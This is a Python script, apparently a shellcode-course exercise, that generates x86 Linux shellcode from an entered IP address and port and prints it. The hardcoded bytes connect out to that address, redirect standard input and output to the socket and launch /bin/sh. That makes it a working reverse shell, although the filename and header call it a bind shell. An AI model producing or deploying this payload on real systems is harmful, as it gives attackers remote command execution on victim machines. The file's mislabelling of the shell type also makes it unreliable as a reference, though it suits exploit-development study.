#coding:utf-8
"""
Filename:      bind_tcp_shell_gen.py
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          Python 3 - Bind TCP shellcode generator

"""

import sys
import struct
import socket

shellcode_begin = "\\x31\\xc0\\x50\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x68"
shellcode_middle = "\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x03\\x66\\x68"
shellcode_end = "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x50\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
shellcode_port = ""
shellcode_ip = ""
port_input_error = "!!! TCP port must be a number between 1 and 65535 !!!"
ip_input_error = "!!! IP address must be in valid format (1.1.1.1) !!!"
nullbyte_error_port = "The TCP port contain null byte, try another one!"
nullbyte_error_ip = "The IP address contain null byte, try another one!"

# Input IP address and validation
input_ip = input("Enter the IP address:")
try:
    for b in socket.inet_aton(input_ip):
        if b == 0:
            sys.exit(nullbyte_error_ip)
        shellcode_ip += '\\x'
        shellcode_ip += '%02x' % b
except socket.error:
    sys.exit(ip_input_error)

# Input port number and validation
input_port = input("Enter TCP port number (1-65535):")
try:
    port = int(input_port)
    if port < 1 or port > 65535:
        sys.exit(port_input_error)
except ValueError:
    sys.exit(port_input_error)

# Convert integer port number to hex string (big-endian) and verify for nullbyte
for x in struct.pack('>H', port):
    if x == 0:
        sys.exit(nullbyte_error_port)
    shellcode_port += '\\x'
    shellcode_port += '%02x' % x

print("-" * 90)
print("Shellcode:")
print("-" * 90)
print(shellcode_begin + shellcode_ip + shellcode_middle + shellcode_port + shellcode_end)
print("-" * 90)
